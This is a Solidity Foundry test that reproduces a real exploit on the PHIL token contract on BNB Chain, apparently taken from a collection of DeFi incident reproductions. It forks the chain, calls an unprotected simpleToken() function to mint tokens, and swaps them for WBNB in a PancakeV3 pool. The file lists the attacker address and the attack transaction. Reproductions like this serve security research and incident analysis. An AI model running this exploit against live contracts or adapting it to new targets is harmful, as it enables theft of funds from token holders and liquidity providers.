// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~2 $BNB
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Vulnerable Contract : https://bscscan.com/address/0x4308d314096878d3bf16c9d8db86101f70bbebf1
// Attack Tx : https://bscscan.com/tx/0x20ecd8310a2cc7f7774aa5a045c8a99ad84a8451d6650f24e0911e9f4355b13a

import "forge-std/Test.sol";
import "./../interface.sol";

interface IPHIL is IERC20 {
    function simpleToken() external;
}

contract ContractTest is Test {
    IPHIL PHIL = IPHIL(0x4308D314096878D3bf16C9d8DB86101F70BBebF1);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V3 PHILTOWBNB = Uni_Pair_V3(0xb8b408A6BD3E43FCDE7D7AbC381ef10bcCcd5349);

    function setUp() public {
        vm.createSelectFork("bsc", 34_345_320 - 1);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(PHIL), "PHIL");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), 18);
        PHIL.simpleToken();
        TOKENToWETH();
        emit log_named_decimal_uint("Attacker WBNB balance after attack", WBNB.balanceOf(address(this)), 18);
    }

    function TOKENToWETH() internal {
        bool zeroForOne = true;
        uint160 sqrtPriceLimitX96 = 4_295_128_740;
        bytes memory data = abi.encodePacked(uint8(0x61));
        int256 amountSpecified = 21000 * 1e18;
        PHILTOWBNB.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
    }

    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    fallback() external payable {}
    receive() external payable {}
}
